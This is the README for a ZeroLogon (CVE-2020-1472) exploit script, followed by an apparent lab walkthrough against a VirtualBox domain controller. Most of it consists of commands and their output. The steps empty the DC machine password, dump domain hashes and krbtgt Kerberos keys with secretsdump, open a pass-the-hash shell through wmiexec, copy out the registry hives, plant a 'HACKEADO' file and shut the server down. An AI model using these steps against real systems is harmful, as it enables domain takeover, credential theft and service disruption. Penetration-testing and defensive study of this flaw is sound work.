# ZeroLogon exploitation script

Exploit code based on https://www.secura.com/blog/zero-logon and https://github.com/SecuraBV/CVE-2020-1472. Original research and scanner by Secura, modifications by RiskSense Inc.

To exploit, clear out any previous Impacket installs you have and install Impacket from https://github.com/SecureAuthCorp/impacket/commit/b867b21 or newer. Then, do:

```
python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
```

If that's successful you will then be able to:
```
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
```
which should get you Domain Admin. After you have that, wmiexec.py to the target DC with a credential from the secretsdump and do
```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

Then you can
```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by
```
python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
```

Reinstalling the original hash is necessary for the DC to continue to operate normally.

# HOW TO
#### install dependencies
```bash
sudo apt-get update
sudo apt-get install python3-venv -y
```

#### Scan for server info
- Server IP: (192.168.1.153)
```bash
sudo nmap -Pn -sU --script nbstat.nse -p137 192.168.1.153
```
##### Output:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 22:29 UTC
Nmap scan report for 192.168.1.153
Host is up (0.00042s latency).

PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:5E:66:0B (Oracle VirtualBox virtual NIC)

Host script results:
| nbstat: NetBIOS name: WIN-3AMIT8RJ9OB, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5e:66:0b (Oracle VirtualBox virtual NIC)
| Names:
|   WIN-3AMIT8RJ9OB<00>  Flags: <unique><active>
|   DOMINIOSERVER<00>    Flags: <group><active>
|   DOMINIOSERVER<1c>    Flags: <group><active>
|   WIN-3AMIT8RJ9OB<20>  Flags: <unique><active>
|_  DOMINIOSERVER<1b>    Flags: <unique><active>

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```
- Server IP: (192.168.1.153)
- netbios name: (WIN-3AMIT8RJ9OB)
- domain name: (DOMINIOSERVER)


#### Create virtual environment
```bash
python3 -m venv zero
cd zero
source bin/activate
```

#### Clone git repo
```bash
git clone https://github.com/risksense/zerologon.git
cd zerologon
pip install -r requirements.txt
pip install impacket
```

- Server IP: (192.168.1.153)
```bash
python3 set_empty_pw.py WIN-3AMIT8RJ9OB 192.168.1.153 
```
- The format ```python3 set_empty_pw.py NETBIOS_NAME SERVER_IP```

```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMINIOSERVER/WIN-3AMIT8RJ9OB$@192.168.1.153'
```
- The ```-hashes :31d6cfe0d16ae931b73c59d7e0c089c0``` value is not important
- The format ```secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'SERVER_DOMAIN/NETBIOS_NAME$@SERVER_IP'```
- domain name: (DOMINIOSERVER)
- netbios name: (WIN-3AMIT8RJ9OB)
- Server IP: (192.168.1.153)

##### Output:
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf404c607f29d847da44a3ee1479398c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c0df59848e7ea6b584b2d9e03cb0b8d7:::
WIN-3AMIT8RJ9OB$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e271a736d7cb730c1a9c5a51a34f318914da65773e3b04217bc0d5f49d0ab778
krbtgt:aes128-cts-hmac-sha1-96:211796a84ea5ef9a157cf214f221465a
krbtgt:des-cbc-md5:d3ecf28f40f1685e
WIN-3AMIT8RJ9OB$:aes256-cts-hmac-sha1-96:20f0ee0401afa50eeaa73f15f25e625a955b7bd05b11a8880cbbd12e6f3116e9
WIN-3AMIT8RJ9OB$:aes128-cts-hmac-sha1-96:29f9aede70c5c3a62035eef7fe617a87
WIN-3AMIT8RJ9OB$:des-cbc-md5:16b9c20e2c230e3e
[*] Cleaning up...
```
- The format is ```<username>:<UserID>:<LMHash>:<NTHash>:::```

#### Create Text file to send
```bash
echo "HACKEADO :3" > newFile.txt
```

#### Get wmiexec.py
```bash
wget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/wmiexec.py
```

#### Use wmiexec.py
```bash
python3 wmiexec.py DOMINIOSERVER/Administrator@192.168.1.153 -hashes aad3b435b51404eeaad3b435b51404ee:cf404c607f29d847da44a3ee1479398c
```
- The format ```python3 wmiexec.py DOMAIN/USER@SERVER_IP -hashes LMHASH:NTHASH```
##### Output
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

#### Send file from linux to windows (inside wmiexec.py) and then shutdown windows Server
```
lput newFile.txt C:\Users\Administrator\Desktop\
shutdown /s /t 0
```
- The format ```lput SOURCE_PATH(Linux) TARGET_PATH(Windows)```

#### To restore original password:
```bash
python3 reinstall_original_pw.py WIN-3AMIT8RJ9OB 192.168.1.153 cf404c607f29d847da44a3ee1479398c
```
- The format ```python3 reinstall_original_pw.py NETBIOS_NAME SERVER_IP NTHASH```